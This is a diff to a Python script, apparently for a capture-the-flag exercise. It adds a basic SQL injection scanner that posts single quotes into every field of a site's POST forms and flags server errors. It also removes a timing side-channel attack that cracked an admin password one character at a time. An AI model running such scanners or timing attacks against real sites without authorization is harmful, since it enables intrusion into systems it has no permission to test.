@@ -1,7 +1,7 @@
 """
 SQL injection attack pentester.
 
-Searches for input fields in the form of a site, and combinatorially posts singular inverted commas into the forms. Seeks out only forms with post actions.
+Searches for input fields in the form of a site, posts singular inverted commas into the forms. Tries to do so for all input fields in case of checks on incomplete forms. Seeks out only forms with post actions.
 
 Looks for error codes over 500 and reports them, with relevant input delivered.
 """
@@ -17,7 +17,18 @@ USERNAME = "admin"
 SAMPLES  = 5         # measurements per candidate — increase if signal is noisy
 CHARSET  = string.ascii_lowercase + string.digits
 
-def get_fields():
+def main():
+    data=get_data()
+    for action in data.keys():
+        print(f"Testing action: {action}")
+        payload=generate_payload(data[action])
+        results=test_payload(URL, payload)
+        if results[0]:
+            print(f"    VULNERABLE: striking form {action} caused error code {results[1]}")
+        else:
+            print(f"    SECURE, striking form {action} caused response code {results[1]}")
+
+def get_data():
     h = httplib2.Http('.cache')
     response, content = h.request(URL)
     forms = BeautifulSoup(content, 'lxml').find_all('form')
@@ -30,23 +41,27 @@ def get_fields():
         action=form.get('action')
         if method == 'POST':
             data[action]=[field.get('name') for field in form.select('input')]
-            
-    print(data)
+    return data
 
-def generate_payloads(fields):
-"""
-Takes as input a list of fields of a given form, and generates a list of data payloads (dicts) containing SQL injection pentest loads of form {"name":" ' ", etc.} to be posted 
-"""
-#TODO
+def generate_payload(fields):
+    """
+    Takes as input a list of fields of a given form, and generates a list of data payloads (dicts)     containing SQL injection pentest loads of form {"name":" ' ", etc.} to be posted 
+    """
+    warhead=" ' " # SQL warhead to inject
+    payload={target:warhead for target in fields}
+    return payload
 
+def test_payload(URL, payload):
+    """
+    Fires payload and checks for vulnerability.
+ 
+    Takes as input a URL, and a payload (a dict containing {form_name:SQL_payload})
 
-
-def check_vuln(resp, payload):
-"""
-Check a response code and flags a vulnerability, with payload used.
-"""
-
-def fire_payloads(URL, payload):
+    Returns [vuln_flag, response_code], the former being a bool denoting vulnerability
+    """
+    resp=requests.post(URL, data=payload).status_code
+    vuln_flag=bool(resp>=500)
+    return [vuln_flag, resp]
 
 
 
@@ -59,32 +74,5 @@ def measure(password: str) -> float:
         total += time.perf_counter() - start
     return total / SAMPLES
 
-
-def crack() -> str:
-    known = ""
-
-    while True:
-        best_char  = None
-        best_time  = 0.0
-
-        for ch in CHARSET:
-            guess = known + ch
-            t = measure(guess)
-            print(f"  {guess!r:<20} {t*1000:.1f} ms")
-            if t > best_time:
-                best_time = t
-                best_char = ch
-
-        known += best_char
-        print(f"\n[+] prefix so far: {known!r}\n")
-
-        # Confirm: if this prefix succeeds as the full password we are done.
-        resp = requests.post(URL, data={"username": USERNAME, "password": known})
-        if "Flag" in resp.text:
-            print(f"[*] Password cracked: {known!r}")
-            print(resp.text)
-            return known
-
-
 if __name__ == "__main__":
-    get_fields()
+    main()
